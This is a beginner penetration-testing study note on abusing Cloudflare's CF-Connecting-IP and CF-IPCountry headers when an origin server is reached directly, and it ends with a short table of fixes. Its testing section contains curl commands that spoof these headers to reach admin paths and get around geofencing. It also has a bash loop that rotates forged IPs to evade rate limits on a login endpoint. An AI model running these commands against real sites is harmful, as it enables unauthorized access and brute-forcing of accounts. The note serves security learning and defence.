---
tags: [vapt, http-headers, web, beginner]
difficulty: beginner
module: "03 - HTTP Headers"
topic: "03.11 CF-Connecting-IP — Cloudflare Header Abuse"
---

# 03.11 — CF-Connecting-IP

## What is it?

`CF-Connecting-IP` is a Cloudflare-specific header that Cloudflare automatically adds to every request it proxies. It contains the original client IP address before Cloudflare. Origin servers behind Cloudflare use this to get the real client IP instead of the Cloudflare edge node's IP.

---

## Normal Cloudflare Flow

```
Client (5.5.5.5)
     |
     v
Cloudflare Edge (104.x.x.x)
     |
     | Cloudflare adds headers:
     | CF-Connecting-IP: 5.5.5.5    ← real client IP
     | CF-RAY: abc123def456-LAX      ← Cloudflare request ID
     | CF-IPCountry: US              ← client country
     | X-Forwarded-For: 5.5.5.5
     v
Origin Server (reads CF-Connecting-IP to get real IP)
```

---

## Attack 1: IP Spoofing (if Cloudflare not on path)

```
If attacker reaches origin directly (bypassing Cloudflare):
  
  GET /api/users HTTP/1.1
  Host: origin-ip-123.45.67.89.com (direct to origin)
  CF-Connecting-IP: 127.0.0.1    ← spoofed!
  
  Origin trusts CF-Connecting-IP → sees 127.0.0.1!
  → Admin access, rate limit bypass, IP allowlist bypass
```

---

## Attack 2: CF-RAY Header — Request Tracing

```
CF-RAY: abc123def456-LAX

This header uniquely identifies the Cloudflare edge request.
Can be used to correlate requests across logs.

Security note: CF-RAY leaks the Cloudflare data center (LAX = Los Angeles).
```

---

## Attack 3: CF-IPCountry — Geofencing Bypass

```
Some apps block/restrict by country (Cloudflare geo-blocking).
If origin server reads CF-IPCountry header directly:

  CF-IPCountry: US   → "appear" as US user!
  
  Bypass if:
  1. Origin is reached directly (no Cloudflare)
  2. App uses header for logic, not Cloudflare geo-rules
```

---

## Testing

```bash
# Find origin IP first (Shodan, SecurityTrails, crt.sh, old DNS)
# Then connect to origin directly with spoofed CF headers:
curl -H "Host: target.com" \
     -H "CF-Connecting-IP: 127.0.0.1" \
     https://<ORIGIN-IP>/admin --insecure

# Geo bypass attempt
curl -H "CF-Connecting-IP: 8.8.8.8" \
     -H "CF-IPCountry: US" \
     https://target.com/us-only-content

# Rate limit bypass
for i in $(seq 1 100); do
  curl -H "CF-Connecting-IP: 1.2.3.$i" https://target.com/login \
    -d "user=admin&pass=test"
done
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Origin trusts CF-Connecting-IP without validation | Only process this header if request came from Cloudflare IP range |
| Direct origin access (no Cloudflare) | Firewall origin to only accept Cloudflare IP ranges |
| Geo bypass via CF-IPCountry | Use Cloudflare WAF geo-rules, not origin header checks |

---

## Related Notes
- [[10 - True-Client-IP]] — sibling Cloudflare header  
- [[02 - X-Forwarded-For]] — original IP forwarding header
- [[15 - CDNs Content Delivery Networks]] — CDN origin IP discovery
- [[12 - Forwarded]] — RFC standard version
